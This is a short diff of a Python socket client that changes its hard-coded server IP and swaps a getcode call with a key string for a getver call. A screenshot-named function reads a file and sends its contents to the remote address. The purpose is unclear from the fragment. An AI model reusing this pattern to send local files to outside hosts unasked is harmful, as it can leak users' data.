@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 from socket import *
 def sends(cmds,can):
-    HOST = '47.105.51.67'
+    HOST = '39.104.84.70'
     PORT = 8680
     BUFSIZ = 1024
     ADDR = (HOST, PORT)
@@ -30,4 +30,8 @@ def LAN_jietu():
         contents = file_object.read()
     return sends('A1', str(contents))
 if __name__ == '__main__':
-    getcode('SXFZ9HJOQ5W4A7HM0JU07YQK78YL9N1ZYH8')
+    strs = str(getver(''))
+    print(strs)
+
+
+    #getcode('SXFZ9HJOQ5W4A7HM0JU07YQK78YL9N1ZYH8')
